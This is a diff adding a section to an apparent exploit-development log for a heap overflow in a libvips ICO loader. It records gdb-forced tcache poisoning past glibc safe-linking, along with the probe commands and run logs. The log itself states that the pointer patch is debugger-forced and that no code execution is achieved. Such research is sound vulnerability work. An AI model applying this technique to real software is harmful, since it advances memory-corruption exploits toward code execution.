@@ -527,3 +527,44 @@ full transition: `next=0x00007ff87bfaa77e` before the write,
 hits. The throwaway tree was removed; no replay logs were committed. This is
 an honest limit on determinism: the pointer-control leg needs a groomed layout
 that occurred in roughly half the attempts, not on every request.
+
+## W6 — safe-linking bound on live tcache control (2026-11-24 12:15-12:30Z, unwitnessed)
+
+Probe `provision/ico_gdb_tcache.py`
+(`sha256=95326911b40a37fb9e6b72a9acfe7cb3a683005da906f571a690eb399c9fcb55`)
+serves the unchanged benign favicon and the same 86-byte crafted ICO as W5 on
+127.0.0.1:18081, runs the unmodified `imgproxy-vuln` CLI under gdb on
+127.0.0.1:18080, sends N benign GETs before one hostile GET, and breaks on
+`vips_foreign_load_read_full` with `len == 0xfffffff5`. At that frame it reads
+`pos = actual_data + 18` (the live tcache `next` field), decodes with
+glibc 2.39 safe-linking (`ptr ^ (pos >> 12)`), patches `next` with an encoded
+chosen target, then calls `malloc(0x20)` twice from the inferior. The patch
+and both malloc calls are debugger-forced; wire input supplies only the ICO.
+
+Commands (from `provision/`):
+
+    python3 ico_gdb_tcache.py ./imgproxy-vuln \
+      ../../libvips2shell/build-vuln-plain/libvips w6v9 2 0x61000000 30
+    python3 ico_gdb_tcache.py ./imgproxy-vuln \
+      ../../libvips2shell/build-vuln-plain/libvips w6v27 2 '($pos + 0x10)' 30
+    python3 ico_gdb_tcache.py ./imgproxy-icofixed \
+      ../../libvips2shell/build-vuln-plain/libvips w6fixed1 2 '($pos + 0x10)' 30
+
+Cured raw logs (others were throwaways and were deleted):
+
+| Log | SHA-256 | Observation |
+| --- | --- | --- |
+| `http-ico-w6v9.log` | `b16751c67a16a639d07ca82311a9974aa5229cba8798441d1c092284a2cd6700` | `pos=0x7fff880b0480`, live `next=0x7ff877f38150` decoding to `0x7fff880b01e0`; wire body's raw `next=0x4141414141414141`; after patch first gdb `malloc(0x20)` returned the victim `0x7fff880b0480`, `tcache->entries[1]=0x61000000`, `count1=6`; second `malloc(0x20)` hit SIGSEGV in `tcache_get_n` (`malloc.c:3186`) |
+| `http-ico-w6v23.log` | `482ef01e7723711e604f4c7bd06baa29345a8664f83b468226955cf09da0c33b` | negative: `info proc mappings` shows `0x609b000-0x80fe000` rw, but gdb reports `Cannot access memory at address 0x61000000`; the fault in w6v9 is target unmapped, not a safe-link bypass |
+| `http-ico-w6v27.log` | `681fe8aeb779bdfb1d772bc97955f5cbb50e43207a99f4e79fc3be785a4d82d4` | mapped heap-derived target `0x7fff700580e0`: first malloc returned victim `0x7fff700580d0`, `tcache->entries[1]` and second `malloc(0x20)` both returned exactly `0x7fff700580e0`, target qwords readable |
+| `http-ico-w6v30.log` | `b4372941b2b4d723b9ffb2560d20e20448ad8346aa5f2995915e2f22ca3ee8e8` | same mechanic at `0x7fffa4058400`, second malloc returned the chosen address |
+| `http-ico-w6fixed1.log` | `47bab70fc30d850975bb6e487878b6a13539746e8cba8afe27d42c3418f0c906` | benign 200, hostile HTTP 500 `ICO image data is too large`, breakpoint installed with zero hits |
+
+Safe-link arithmetic check from W5's committed log: `pos>>12 = 0x7fff7c03e`,
+`0x00007ff883f42c4e ^ 0x7fff7c03e = 0x7fff7c03ec70`. The raw wire value
+`0x4141414141414141` therefore decodes to a noncanonical address; W5's claim
+remains metadata control, not controlled allocation. Heap addresses differed
+between runs (`0x7fff880b0480`, `0x7fff800019a0`, `0x7fffa40583de`), so no
+wire-only safe-link key is established. No code-pointer write, marker, command
+or r5 is claimed; witness replay is still owed. Ports were free after the
+runs; no probe left loopback.
